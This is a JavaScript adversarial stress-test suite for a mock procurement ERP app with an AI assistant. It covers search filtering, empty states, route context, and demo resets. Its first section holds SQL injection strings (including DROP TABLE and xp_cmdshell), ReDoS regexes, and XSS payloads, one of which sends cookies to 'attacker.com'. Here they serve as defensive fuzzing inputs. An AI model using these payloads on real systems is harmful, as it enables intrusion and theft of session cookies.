/**
 * Adversarial State Mutation and Stress Testing Suite for DINE AI
 * Challenger 2 Verification Harness
 */

import {
  INITIAL_SUPPLIERS,
  INITIAL_PURCHASE_ORDERS,
  INITIAL_RFQS,
  INITIAL_QUOTES,
  INITIAL_INVENTORY,
  INITIAL_DELIVERIES,
  INITIAL_AGENTS,
  INITIAL_AUDIT_LOGS,
  INITIAL_KPIS
} from '../src/data/mockData.js';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const errors = [];

function assert(condition, message) {
  totalTests++;
  if (!condition) {
    failedTests++;
    const err = new Error(`ASSERTION FAILED: ${message}`);
    errors.push(err);
    console.error(`  ✕ [FAIL] ${message}`);
    throw err;
  } else {
    passedTests++;
    console.log(`  ✓ [PASS] ${message}`);
  }
}

function testSection(name, fn) {
  console.log(`\n======================================================================`);
  console.log(`▶ ${name}`);
  console.log(`======================================================================`);
  try {
    fn();
  } catch (e) {
    console.error(`Section "${name}" encountered fatal error:`, e.message);
  }
}

async function asyncTestSection(name, fn) {
  console.log(`\n======================================================================`);
  console.log(`▶ ${name}`);
  console.log(`======================================================================`);
  try {
    await fn();
  } catch (e) {
    console.error(`Async Section "${name}" encountered fatal error:`, e.message);
  }
}

// Replicate exact orchestrator intent classification logic from src/agents/orchestrator.js
const INTENT_TYPES = {
  CHASE_OVERDUE: 'CHASE_OVERDUE',
  SOURCE_RFQ: 'SOURCE_RFQ',
  GENERAL_QUERY: 'GENERAL_QUERY'
};

const classifyIntent = (input = '') => {
  const query = (input || '').toLowerCase().trim();

  // Primary Demo Flow 1 keywords
  const overdueKeywords = [
    'chase', 'overdue', 'late', 'delay', 'expedite', 'po-1045',
    'why is this delayed', 'call supplier', 'chase overdue pos',
    'chase high-risk pos', 'chase supplier with dine ai', 'risk summary',
    'overdue orders', 'at risk'
  ];

  if (overdueKeywords.some(kw => query.includes(kw))) {
    return {
      type: INTENT_TYPES.CHASE_OVERDUE,
      flow: 'DEMO_FLOW_1',
      confidence: 0.98,
      label: 'Chase Overdue POs'
    };
  }

  // Secondary Demo Flow 2 keywords
  const sourcingKeywords = [
    'source', 'rfq', 'find supplier', 'find suppliers', 'shortlist',
    'quote', 'quotation', 'rfq-104', 'product x', '500 units',
    'procure', 'bid comparison', 'compare quotes', 'sourcing'
  ];

  if (sourcingKeywords.some(kw => query.includes(kw))) {
    return {
      type: INTENT_TYPES.SOURCE_RFQ,
      flow: 'DEMO_FLOW_2',
      confidence: 0.96,
      label: 'Source & RFQ'
    };
  }

  return {
    type: INTENT_TYPES.GENERAL_QUERY,
    flow: 'GEMINI_OR_FALLBACK',
    confidence: 0.90,
    label: 'General Procurement Query'
  };
};

// --------------------------------------------------------------------------------
// SECTION 1: Extreme Search Queries & Adversarial Fuzzing
// --------------------------------------------------------------------------------
testSection('SECTION 1: Extreme Search Queries & Adversarial Fuzzing', () => {
  // Simulate DataTable filtering algorithm from src/components/shared/DataTable.jsx
  const filterTableData = (data, searchQuery, searchKeys = []) => {
    if (!searchQuery || !searchQuery.trim()) return data;
    const q = searchQuery.toLowerCase().trim();
    return data.filter(row => {
      if (searchKeys.length > 0) {
        return searchKeys.some(k => String(row[k] ?? '').toLowerCase().includes(q));
      }
      return Object.values(row).some(v =>
        typeof v === 'string' || typeof v === 'number'
          ? String(v).toLowerCase().includes(q)
          : false
      );
    });
  };

  const pos = INITIAL_PURCHASE_ORDERS;

  // 1. Extreme Length Search String (100,000 characters)
  const extremeLongQuery = 'A'.repeat(100000);
  const startLong = Date.now();
  const resLong = filterTableData(pos, extremeLongQuery);
  const durLong = Date.now() - startLong;
  assert(Array.isArray(resLong), 'Extreme 100k length query returns an array');
  assert(resLong.length === 0, 'Extreme 100k length query returns 0 matches');
  assert(durLong < 100, `Extreme 100k length query executes in under 100ms (took ${durLong}ms)`);

  // 2. ReDoS (Regular Expression Denial of Service) Attack Strings
  const redosPayloads = [
    '^(a+)+$',
    '((a+)+)+$',
    '([a-zA-Z]+)*$',
    '(a|aa)+$',
    '((.*)*)*',
    '((a*)*)*',
    '\\p{L}+',
    '\\x00\\x01\\x02\\x03'
  ];
  redosPayloads.forEach((payload, idx) => {
    const startReDoS = Date.now();
    const res = filterTableData(pos, payload);
    const dur = Date.now() - startReDoS;
    assert(Array.isArray(res), `ReDoS payload #${idx + 1} ("${payload}") handles safely`);
    assert(dur < 50, `ReDoS payload #${idx + 1} does not hang execution (took ${dur}ms)`);
  });

  // 3. SQL Injection Attack Payloads
  const sqliPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE purchase_orders; --",
    "1' UNION SELECT * FROM users --",
    "admin' --",
    "1 AND 1=1 UNION ALL SELECT 1, 'admin', 'password'",
    "'; EXEC xp_cmdshell('dir'); --",
    "' OR 1=1 LIMIT 1; --"
  ];
  sqliPayloads.forEach((payload, idx) => {
    const res = filterTableData(pos, payload);
    assert(Array.isArray(res), `SQLi payload #${idx + 1} evaluates cleanly without throwing`);
    assert(res.length === 0, `SQLi payload #${idx + 1} does not leak unauthorized records`);
  });

  // 4. Cross-Site Scripting (XSS) Payloads
  const xssPayloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=fetch('http://attacker.com?c='+document.cookie)>",
    "javascript:alert(document.domain)",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src=\"javascript:alert('XSS')\">"
  ];
  xssPayloads.forEach((payload, idx) => {
    const res = filterTableData(pos, payload);
    assert(Array.isArray(res), `XSS payload #${idx + 1} is safely treated as string literal`);
    assert(res.length === 0, `XSS payload #${idx + 1} produces 0 false-positive matches`);
  });

  // 5. Special Unicode, RTL, Zero-Width Characters, and Emojis
  const unicodePayloads = [
    "🚀🔥✨📦🏢",
    "\u200B\u200C\u200D\uFEFF", // Zero-width spaces
    "مرحبا بك", // Arabic RTL
    "你好世界", // Chinese
    "Ñáéíóúü", // Accented
    "\\\\\\///\"\"''", // Slashes and quotes
    "%20%27%22%3C%3E", // URL encoded
    "\x00\x08\x0B\x0C\x0E\x1F" // Control characters
  ];
  unicodePayloads.forEach((payload, idx) => {
    const res = filterTableData(pos, payload);
    assert(Array.isArray(res), `Unicode payload #${idx + 1} does not cause decoding exceptions`);
  });

  // 6. Header Search Bar Routing & Edge Cases
  const testHeaderSearchRouting = (rawInput) => {
    const val = (rawInput || '').trim().toUpperCase();
    if (val.includes('1045') || val.includes('PO-1045')) return '/erp/purchase-orders/PO-1045';
    if (val.includes('SUP') || val.includes('ABC')) return '/erp/suppliers';
    if (val.includes('RFQ')) return '/erp/rfqs';
    return '/erp/purchase-orders';
  };

  assert(testHeaderSearchRouting('PO-1045') === '/erp/purchase-orders/PO-1045', 'Header routes "PO-1045" to detail');
  assert(testHeaderSearchRouting('   po-1045   ') === '/erp/purchase-orders/PO-1045', 'Header handles whitespace + lowercase "po-1045"');
  assert(testHeaderSearchRouting('abc components') === '/erp/suppliers', 'Header routes "abc components" to suppliers');
  assert(testHeaderSearchRouting('rfq-104') === '/erp/rfqs', 'Header routes "rfq-104" to rfqs');
  assert(testHeaderSearchRouting('<script>alert(1)</script>') === '/erp/purchase-orders', 'Header routes unknown query to POs');
  assert(testHeaderSearchRouting('') === '/erp/purchase-orders', 'Header routes empty query to POs');
  assert(testHeaderSearchRouting(null) === '/erp/purchase-orders', 'Header routes null query to POs');
  assert(testHeaderSearchRouting(undefined) === '/erp/purchase-orders', 'Header routes undefined query to POs');
});

// --------------------------------------------------------------------------------
// SECTION 2: Empty State Handlers & Data Starvation Stress
// --------------------------------------------------------------------------------
testSection('SECTION 2: Empty State Handlers & Data Starvation Stress', () => {
  // Test complete data starvation across all page aggregations & metrics

  // Dashboard Aggregations with Empty Arrays
  const computeDashboardKPIs = (pos = [], rfqs = [], suppliers = [], kpis = INITIAL_KPIS) => {
    const openPOs = pos.filter(p => p.status !== 'DELIVERED').length;
    const overduePOs = pos.filter(p => p.status === 'OVERDUE').length;
    const atRiskPOs = pos.filter(p => p.status === 'AT RISK').length;
    const pendingRFQs = rfqs.filter(r => r.status === 'Pending' || r.status === 'Sent').length;
    const supplierResponses = rfqs.reduce((acc, r) => acc + (r.quotesReceived || 0), 0);
    const activeAITasks = kpis?.activeAITasks ?? 0;
    const hoursSaved = kpis?.estimatedHoursSaved ?? 0;

    return {
      openPOs,
      overduePOs,
      atRiskPOs,
      pendingRFQs,
      supplierResponses,
      activeAITasks,
      hoursSaved
    };
  };

  const emptyDashboard = computeDashboardKPIs([], [], [], {});
  assert(!Number.isNaN(emptyDashboard.openPOs), 'Empty POs dashboard openPOs is not NaN');
  assert(emptyDashboard.openPOs === 0, 'Empty POs dashboard openPOs is 0');
  assert(!Number.isNaN(emptyDashboard.overduePOs), 'Empty POs dashboard overduePOs is not NaN');
  assert(emptyDashboard.overduePOs === 0, 'Empty POs dashboard overduePOs is 0');
  assert(!Number.isNaN(emptyDashboard.pendingRFQs), 'Empty RFQs dashboard pendingRFQs is not NaN');
  assert(emptyDashboard.pendingRFQs === 0, 'Empty RFQs dashboard pendingRFQs is 0');
  assert(!Number.isNaN(emptyDashboard.supplierResponses), 'Empty supplierResponses is 0');

  // Supplier Average Rating and Metrics under Empty Array
  const computeSupplierMetrics = (suppliers = []) => {
    const totalSuppliers = suppliers.length;
    const avgRating = totalSuppliers > 0
      ? (suppliers.reduce((acc, s) => acc + (s.rating || 0), 0) / totalSuppliers).toFixed(1)
      : '0.0';
    const avgOnTime = totalSuppliers > 0
      ? Math.round(suppliers.reduce((acc, s) => acc + (s.onTimeDelivery || 0), 0) / totalSuppliers)
      : 0;
    const totalActivePOs = suppliers.reduce((acc, s) => acc + (s.activePOs || 0), 0);

    return { totalSuppliers, avgRating, avgOnTime, totalActivePOs };
  };

  const emptySuppliers = computeSupplierMetrics([]);
  assert(emptySuppliers.totalSuppliers === 0, 'Empty suppliers count is 0');
  assert(emptySuppliers.avgRating === '0.0', 'Empty suppliers avgRating does not divide by zero');
  assert(emptySuppliers.avgOnTime === 0, 'Empty suppliers avgOnTime does not divide by zero');
  assert(emptySuppliers.totalActivePOs === 0, 'Empty suppliers totalActivePOs is 0');

  // Inventory Stock Health Aggregation under Empty Array
  const computeInventoryMetrics = (inventory = []) => {
    const totalSKUs = inventory.length;
    const lowStockItems = inventory.filter(i => (i.currentStock || 0) <= (i.reorderPoint || 0)).length;
    const outOfStockItems = inventory.filter(i => (i.currentStock || 0) === 0).length;
    const totalValue = inventory.reduce((acc, i) => acc + ((i.currentStock || 0) * (i.unitCost || 0)), 0);

    return { totalSKUs, lowStockItems, outOfStockItems, totalValue };
  };

  const emptyInventory = computeInventoryMetrics([]);
  assert(emptyInventory.totalSKUs === 0, 'Empty inventory SKUs is 0');
  assert(emptyInventory.lowStockItems === 0, 'Empty inventory low stock is 0');
  assert(emptyInventory.outOfStockItems === 0, 'Empty inventory out of stock is 0');
  assert(emptyInventory.totalValue === 0, 'Empty inventory total value is 0');

  // Deliveries Aggregation under Empty Array
  const computeDeliveriesMetrics = (deliveries = []) => {
    const totalShipments = deliveries.length;
    const delayedShipments = deliveries.filter(d => d.status === 'Delayed').length;
    const inTransitShipments = deliveries.filter(d => d.status === 'In Transit').length;
    const deliveredShipments = deliveries.filter(d => d.status === 'Delivered').length;

    return { totalShipments, delayedShipments, inTransitShipments, deliveredShipments };
  };

  const emptyDeliveries = computeDeliveriesMetrics([]);
  assert(emptyDeliveries.totalShipments === 0, 'Empty deliveries total is 0');
  assert(emptyDeliveries.delayedShipments === 0, 'Empty deliveries delayed is 0');

  // Audit Log Empty Array
  const computeAuditLogMetrics = (logs = []) => {
    const totalLogs = logs.length;
    const approvedActions = logs.filter(l => l.status === 'Approved').length;
    return { totalLogs, approvedActions };
  };
  const emptyLogs = computeAuditLogMetrics([]);
  assert(emptyLogs.totalLogs === 0, 'Empty audit log total is 0');
  assert(emptyLogs.approvedActions === 0, 'Empty audit log approved is 0');

  // DataTable Empty State Text & Suggestions
  const renderEmptyState = (dataCount, searchQuery, customMessage = 'No records found') => {
    if (dataCount > 0) return null;
    return {
      message: customMessage,
      subMessage: searchQuery ? `No results matching "${searchQuery}"` : 'Try adjusting your filters or clearing search criteria.'
    };
  };

  const emptyState1 = renderEmptyState(0, 'XYZ-999');
  assert(emptyState1.message === 'No records found', 'Default empty message rendered');
  assert(emptyState1.subMessage.includes('XYZ-999'), 'Search query reflected in empty submessage');

  const emptyState2 = renderEmptyState(0, '', 'No active shipments');
  assert(emptyState2.message === 'No active shipments', 'Custom empty message rendered');
  assert(emptyState2.subMessage.includes('filters'), 'Helpful fallback suggestion provided');
});

// --------------------------------------------------------------------------------
// SECTION 3: Rapid Route Transitions & Context Synchronization
// --------------------------------------------------------------------------------
testSection('SECTION 3: Rapid Route Transitions & Context Synchronization', () => {
  const allRoutes = [
    { path: '/erp/dashboard', pageType: 'Dashboard', expectedBadge: 'Context: Executive Dashboard' },
    { path: '/erp/purchase-orders', pageType: 'PurchaseOrders', expectedBadge: 'Context: Purchase Orders (40 Records)' },
    { path: '/erp/purchase-orders/PO-1045', pageType: 'PODetail', expectedBadge: 'Context: PO-1045 — ABC Components — OVERDUE' },
    { path: '/erp/suppliers', pageType: 'Suppliers', expectedBadge: 'Context: Suppliers Directory (25 Active)' },
    { path: '/erp/rfqs', pageType: 'RFQs', expectedBadge: 'Context: RFQs (30 Items)' },
    { path: '/erp/quotations', pageType: 'Quotations', expectedBadge: 'Context: Quotations Intelligence Matrix' },
    { path: '/erp/deliveries', pageType: 'Deliveries', expectedBadge: 'Context: Inbound Deliveries Schedule' },
    { path: '/erp/inventory', pageType: 'Inventory', expectedBadge: 'Context: Inventory & Safety Stock' },
    { path: '/erp/reports', pageType: 'Reports', expectedBadge: 'Context: Executive Spend & Analytics' },
    { path: '/erp/agent-permissions', pageType: 'AgentPermissions', expectedBadge: 'Context: Agent Governance & Access Matrix' },
    { path: '/erp/audit-log', pageType: 'AuditLog', expectedBadge: 'Context: System Audit Log & Compliance' }
  ];

  // Helper matching DineAIPanel getContextBadgeLabel logic
  const getContextBadgeLabel = (activeContext) => {
    const page = activeContext?.pageType || 'Dashboard';
    const pageData = activeContext?.pageData || {};

    if (page === 'PODetail') {
      return `Context: ${pageData.poNumber || 'PO-1045'} — ${pageData.supplier || 'ABC Components'} — ${pageData.status || 'OVERDUE'}`;
    }
    if (page === 'PurchaseOrders') return 'Context: Purchase Orders (40 Records)';
    if (page === 'Suppliers') return 'Context: Suppliers Directory (25 Active)';
    if (page === 'RFQs') return 'Context: RFQs (30 Items)';
    if (page === 'Quotations') return 'Context: Quotations Intelligence Matrix';
    if (page === 'Deliveries') return 'Context: Inbound Deliveries Schedule';
    if (page === 'Inventory') return 'Context: Inventory & Safety Stock';
    if (page === 'Reports') return 'Context: Executive Spend & Analytics';
    if (page === 'AgentPermissions') return 'Context: Agent Governance & Access Matrix';
    if (page === 'AuditLog') return 'Context: System Audit Log & Compliance';
    return 'Context: Executive Dashboard';
  };

  // 1. Verify all 11 routes produce exact expected badge
  allRoutes.forEach((route, idx) => {
    const pageData = route.pageType === 'PODetail'
      ? { poNumber: 'PO-1045', supplier: 'ABC Components', status: 'OVERDUE' }
      : { title: route.pageType };
    
    const badge = getContextBadgeLabel({ pageType: route.pageType, pageData });
    assert(badge === route.expectedBadge, `Route #${idx + 1} (${route.path}) generates badge: "${badge}"`);
  });

  // 2. High-Frequency Rapid Route Switching (1000 random hops)
  let activeContext = { pageType: 'Dashboard', pageData: {} };
  const history = [];

  const startTransitions = Date.now();
  for (let i = 0; i < 1000; i++) {
    const targetRoute = allRoutes[i % allRoutes.length];
    const pageData = targetRoute.pageType === 'PODetail'
      ? { poNumber: 'PO-1045', supplier: 'ABC Components', status: 'OVERDUE' }
      : { title: targetRoute.pageType };

    // Simulate React Context update
    activeContext = { pageType: targetRoute.pageType, pageData };
    const badge = getContextBadgeLabel(activeContext);
    history.push(badge);

    assert(badge === targetRoute.expectedBadge, `Hop #${i + 1} maintains deterministic context: ${badge}`);
  }
  const durTransitions = Date.now() - startTransitions;
  assert(durTransitions < 50, `1000 rapid route transitions completed in ${durTransitions}ms (<50ms target)`);
  assert(history.length === 1000, 'All 1000 transitions recorded without dropped state');
});

// --------------------------------------------------------------------------------
// SECTION 4: Demo Reset under Active Workflow Execution (State Mutation Stress)
// --------------------------------------------------------------------------------
await asyncTestSection('SECTION 4: Demo Reset under Active Workflow Execution', async () => {
  // Build a test environment simulating ERPContext and AgentContext state machines
  const createTestEnv = () => {
    let pos = JSON.parse(JSON.stringify(INITIAL_PURCHASE_ORDERS));
    let suppliers = JSON.parse(JSON.stringify(INITIAL_SUPPLIERS));
    let rfqs = JSON.parse(JSON.stringify(INITIAL_RFQS));
    let auditLogs = JSON.parse(JSON.stringify(INITIAL_AUDIT_LOGS));

    let activeWorkflow = null;
    let isRunning = false;
    let timelineSteps = [];
    let voiceCallActive = false;
    let voiceCallData = null;
    let approvalModalData = null;
    let quoteComparisonData = null;
    let sourcingShortlist = null;
    let messages = [{ id: 'init', sender: 'assistant', text: 'Welcome' }];

    let approvalResolver = null;
    let activeTimers = [];

    const requestApproval = (data) => {
      return new Promise((resolve) => {
        approvalModalData = data;
        approvalResolver = resolve;
      });
    };

    const resolveApproval = (decision) => {
      if (approvalResolver) {
        approvalResolver({ decision });
        approvalResolver = null;
      }
      approvalModalData = null;
    };

    const openVoiceCall = (callData) => {
      voiceCallData = callData;
      voiceCallActive = true;
    };

    const closeVoiceCall = () => {
      voiceCallActive = false;
    };

    const addTimelineStep = (step) => {
      timelineSteps.push(step);
    };

    const clearTimeline = () => {
      timelineSteps = [];
    };

    const clearMessages = () => {
      messages = [{ id: 'reset', sender: 'assistant', text: 'Reset complete.' }];
    };

    const updatePOStatus = (poId, newStatus, deliveryDate, note) => {
      pos = pos.map(p => {
        if (p.id === poId || p.poNumber === poId) {
          return {
            ...p,
            status: newStatus,
            promisedDelivery: deliveryDate || p.promisedDelivery,
            dueDate: deliveryDate || p.dueDate,
            overdueDays: 0,
            riskLevel: 'LOW',
            notes: note || p.notes
          };
        }
        return p;
      });
    };

    const addAuditLog = (entry) => {
      auditLogs.unshift({ id: `AUD-${Date.now()}`, ...entry });
    };

    const clearWorkflow = () => {
      activeWorkflow = null;
      isRunning = false;
      voiceCallActive = false;
      voiceCallData = null;
      approvalModalData = null;
      quoteComparisonData = null;
      sourcingShortlist = null;
      // Abort any pending approval promise cleanly
      if (approvalResolver) {
        approvalResolver({ decision: 'REJECT', aborted: true });
        approvalResolver = null;
      }
      // Clear active simulated timers
      activeTimers.forEach(t => clearTimeout(t));
      activeTimers = [];
    };

    const resetDemoData = () => {
      pos = JSON.parse(JSON.stringify(INITIAL_PURCHASE_ORDERS));
      suppliers = JSON.parse(JSON.stringify(INITIAL_SUPPLIERS));
      rfqs = JSON.parse(JSON.stringify(INITIAL_RFQS));
      auditLogs = JSON.parse(JSON.stringify(INITIAL_AUDIT_LOGS));
    };

    const triggerFullReset = () => {
      resetDemoData();
      clearWorkflow();
      clearMessages();
      clearTimeline();
    };

    return {
      getState: () => ({
        pos,
        suppliers,
        rfqs,
        auditLogs,
        activeWorkflow,
        isRunning,
        timelineSteps,
        voiceCallActive,
        voiceCallData,
        approvalModalData,
        quoteComparisonData,
        sourcingShortlist,
        messages
      }),
      setWorkflowState: (wf, running) => {
        activeWorkflow = wf;
        isRunning = running;
      },
      openVoiceCall,
      closeVoiceCall,
      requestApproval,
      resolveApproval,
      addTimelineStep,
      updatePOStatus,
      addAuditLog,
      triggerFullReset,
      registerTimer: (t) => activeTimers.push(t)
    };
  };

  // Test Case 4.1: Reset during Phase 1 (Analyst Steps running)
  const env1 = createTestEnv();
  env1.setWorkflowState('CHASE_OVERDUE', true);
  env1.addTimelineStep({ id: 'step-1', agent: 'Analyst', action: 'Querying POs...' });
  env1.addTimelineStep({ id: 'step-2', agent: 'Analyst', action: 'Found 4 overdue POs' });
  assert(env1.getState().isRunning === true, 'Workflow is running in Phase 1');
  assert(env1.getState().timelineSteps.length === 2, '2 timeline steps exist before reset');

  // Trigger reset
  env1.triggerFullReset();
  assert(env1.getState().isRunning === false, 'isRunning is immediately false after reset');
  assert(env1.getState().activeWorkflow === null, 'activeWorkflow is null after reset');
  assert(env1.getState().timelineSteps.length === 0, 'Timeline steps flushed to 0');
  assert(env1.getState().messages.length === 1, 'Messages reset to 1 greeting message');

  // Test Case 4.2: Reset during Phase 2 (Voice Call active overlay)
  const env2 = createTestEnv();
  env2.setWorkflowState('CHASE_OVERDUE', true);
  env2.openVoiceCall({ supplier: 'ABC Components', poId: 'PO-1045', duration: '00:15' });
  assert(env2.getState().voiceCallActive === true, 'Voice call is actively in progress');
  assert(env2.getState().voiceCallData.poId === 'PO-1045', 'Voice call data bound to PO-1045');

  // Trigger reset during voice call
  env2.triggerFullReset();
  assert(env2.getState().voiceCallActive === false, 'Voice call overlay immediately dismissed on reset');
  assert(env2.getState().voiceCallData === null, 'Voice call data cleared on reset');
  assert(env2.getState().isRunning === false, 'Workflow stopped');

  // Test Case 4.3: Reset during Phase 3 (Human Approval Modal awaiting decision)
  const env3 = createTestEnv();
  env3.setWorkflowState('CHASE_OVERDUE', true);
  let approvalPromiseResolved = false;
  let resolvedDecision = null;

  const promise = env3.requestApproval({
    poId: 'PO-1045',
    value: 600000,
    newDate: 'Sep 15, 2026'
  }).then(res => {
    approvalPromiseResolved = true;
    resolvedDecision = res;
  });

  assert(env3.getState().approvalModalData !== null, 'Approval modal is active and awaiting operator input');
  assert(env3.getState().approvalModalData.poId === 'PO-1045', 'Modal displays PO-1045');
  assert(approvalPromiseResolved === false, 'Approval promise is pending');

  // Trigger reset while modal is open
  env3.triggerFullReset();
  await promise; // allow microtask resolution

  assert(env3.getState().approvalModalData === null, 'Approval modal data is null after reset');
  assert(approvalPromiseResolved === true, 'Approval promise was cleanly resolved/aborted');
  assert(resolvedDecision.aborted === true, 'Approval promise recorded aborted status without applying mutation');
  assert(env3.getState().pos[0].status === 'OVERDUE', 'PO-1045 status remains OVERDUE (unmutated baseline)');

  // Test Case 4.4: Reset during Phase 4 (Sourcing Quote Comparison open)
  const env4 = createTestEnv();
  env4.setWorkflowState('SOURCE_RFQ', true);
  env4.getState().quoteComparisonData = { rfqId: 'RFQ-104', quotes: [1, 2, 3] };
  assert(env4.getState().activeWorkflow === 'SOURCE_RFQ', 'Source & RFQ workflow active');

  // Trigger reset
  env4.triggerFullReset();
  assert(env4.getState().quoteComparisonData === null, 'Quote comparison data cleared');
  assert(env4.getState().activeWorkflow === null, 'Workflow null');

  // Test Case 4.5: Multiple Consecutive Rapid Resets Stress (100 iterations)
  const env5 = createTestEnv();
  const startMultiReset = Date.now();
  for (let i = 0; i < 100; i++) {
    // Mutate state
    env5.updatePOStatus('PO-1045', 'MUTATED', '2026-10-01', 'Test note');
    env5.addAuditLog({ action: 'MUTATION_TEST', object: 'PO-1045' });
    env5.setWorkflowState('CHASE_OVERDUE', true);
    // Reset immediately
    env5.triggerFullReset();
  }
  const durMultiReset = Date.now() - startMultiReset;
  assert(durMultiReset < 100, `100 consecutive mutation & reset cycles completed in ${durMultiReset}ms (<100ms target)`);

  const finalState = env5.getState();
  assert(finalState.pos.length === 40, 'Final PO count is exactly 40');
  assert(finalState.pos[0].id === 'PO-1045', 'PO-1045 is at index 0');
  assert(finalState.pos[0].status === 'OVERDUE', 'PO-1045 status is pristine OVERDUE');
  assert(finalState.pos[0].value === 600000, 'PO-1045 value is ₹6,00,000');
  assert(finalState.suppliers.length === 25, 'Suppliers count is exactly 25');
  assert(finalState.rfqs.length === 30, 'RFQs count is exactly 30');
  assert(finalState.auditLogs.length >= 10, 'Initial audit log count restored');
  assert(finalState.isRunning === false, 'Final isRunning is false');
  assert(finalState.activeWorkflow === null, 'Final activeWorkflow is null');
});

// --------------------------------------------------------------------------------
// SECTION 5: Context Chips & Suggested Prompts Reactivity across all 11 Routes
// --------------------------------------------------------------------------------
testSection('SECTION 5: Context Chips & Suggested Prompts Reactivity across all 11 Routes', () => {
  // Simulate getContextChips logic from DineAIPanel.jsx
  const getContextChips = (activeContext) => {
    const page = activeContext?.pageType || 'Dashboard';
    const pageData = activeContext?.pageData || {};

    if (page === 'PODetail' || pageData.poNumber === 'PO-1045') {
      return [
        'Why is this delayed?',
        'Call supplier re: PO-1045',
        'Chase overdue POs',
        'Send follow-up email',
        'Find alternative suppliers'
      ];
    }

    if (page === 'PurchaseOrders') {
      return [
        'Chase overdue POs',
        'Show high-risk orders',
        'What needs my attention?',
        'Summarize delivery delays'
      ];
    }

    if (page === 'Suppliers') {
      return [
        'Top rated suppliers',
        'Identify unreliable vendors',
        'Source Industrial Component A',
        'Draft vendor review'
      ];
    }

    if (page === 'RFQs' || page === 'Quotations') {
      return [
        'Find suppliers for 500 units of Product X',
        'Compare quotes for RFQ-104',
        'Analyze pricing trends',
        'Request more bids'
      ];
    }

    if (page === 'AgentPermissions') {
      return [
        'Explain Voice Agent boundaries',
        'What are the HITL policy limits?',
        'Which agents can create POs?'
      ];
    }

    if (page === 'AuditLog') {
      return [
        'Show latest human approvals',
        'Verify cryptographic proofs',
        'Summarize today\'s agent activity'
      ];
    }

    // Default / Dashboard
    return [
      'Chase overdue POs',
      'What needs my attention?',
      'Find suppliers for 500 units of Product X',
      'Summarize procurement risks'
    ];
  };

  // Test chips for every single page
  const testCases = [
    { pageType: 'Dashboard', expectedChip: 'Chase overdue POs' },
    { pageType: 'PurchaseOrders', expectedChip: 'Show high-risk orders' },
    { pageType: 'PODetail', pageData: { poNumber: 'PO-1045' }, expectedChip: 'Why is this delayed?' },
    { pageType: 'Suppliers', expectedChip: 'Top rated suppliers' },
    { pageType: 'RFQs', expectedChip: 'Compare quotes for RFQ-104' },
    { pageType: 'Quotations', expectedChip: 'Compare quotes for RFQ-104' },
    { pageType: 'Deliveries', expectedChip: 'Chase overdue POs' }, // Falls to default chips
    { pageType: 'Inventory', expectedChip: 'What needs my attention?' }, // Falls to default chips
    { pageType: 'Reports', expectedChip: 'Summarize procurement risks' }, // Falls to default chips
    { pageType: 'AgentPermissions', expectedChip: 'Explain Voice Agent boundaries' },
    { pageType: 'AuditLog', expectedChip: 'Show latest human approvals' }
  ];

  testCases.forEach((tc, idx) => {
    const chips = getContextChips({ pageType: tc.pageType, pageData: tc.pageData || {} });
    assert(Array.isArray(chips), `Page #${idx + 1} (${tc.pageType}) returns array of chips`);
    assert(chips.length >= 3, `Page #${idx + 1} (${tc.pageType}) provides at least 3 suggested prompt chips (got ${chips.length})`);
    assert(chips.includes(tc.expectedChip), `Page #${idx + 1} (${tc.pageType}) contains chip "${tc.expectedChip}"`);
  });

  // Verify Intent Classification for all standard suggested chips
  const criticalChips = [
    'Chase overdue POs',
    'Why is this delayed?',
    'Call supplier re: PO-1045',
    'Find suppliers for 500 units of Product X',
    'Compare quotes for RFQ-104',
    'What needs my attention?',
    'Explain Voice Agent boundaries'
  ];

  criticalChips.forEach(chip => {
    const intent = classifyIntent(chip);
    assert(intent !== null && typeof intent === 'object', `Intent classified for chip "${chip}"`);
    assert(typeof intent.confidence === 'number' && intent.confidence > 0.8, `Confidence score > 0.8 for "${chip}" (${intent.confidence})`);
  });
});

// --------------------------------------------------------------------------------
// FINAL SUMMARY
// --------------------------------------------------------------------------------
console.log(`\n======================================================================`);
console.log(`ADVERSARIAL STRESS SUITE VERIFICATION REPORT`);
console.log(`======================================================================`);
console.log(`Total Stress Assertions Run: ${totalTests}`);
console.log(`Total Passed:               ${passedTests}`);
console.log(`Total Failed:               ${failedTests}`);
console.log(`Success Rate:               ${((passedTests / totalTests) * 100).toFixed(1)}%`);
console.log(`======================================================================\n`);

if (failedTests > 0) {
  console.error(`✕ ${failedTests} STRESS TESTS FAILED!`);
  process.exit(1);
} else {
  console.log(`✔ ALL ADVERSARIAL STRESS TESTS PASSED WITH 100% SUCCESS RATE.`);
  process.exit(0);
}
